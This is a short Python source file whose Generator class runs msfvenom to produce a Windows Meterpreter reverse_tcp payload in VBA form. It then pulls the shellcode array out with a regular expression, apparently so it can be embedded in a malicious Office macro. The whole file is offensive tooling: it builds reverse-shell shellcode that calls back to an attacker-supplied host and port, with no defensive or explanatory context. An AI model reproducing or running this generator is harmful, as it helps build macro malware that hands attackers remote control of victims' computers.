import os
import re

class Generator():

	shellcode = ''

	def genShellcode(self, framework, host, port):
		#TODO fix to us estring .format
		code = os.popen("msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST="+host+" LPORT="+port+" -f vba >&1").read()
		self.shellcode = re.findall(r"(Array\(((\-|\d).*)\s+|^(\-|\d)(.*?(_|\d\))\s+))", code, flags=re.MULTILINE)
		self.shellcode = ''.join(i[0].replace('', '') for i in self.shellcode)
		return self.shellcode
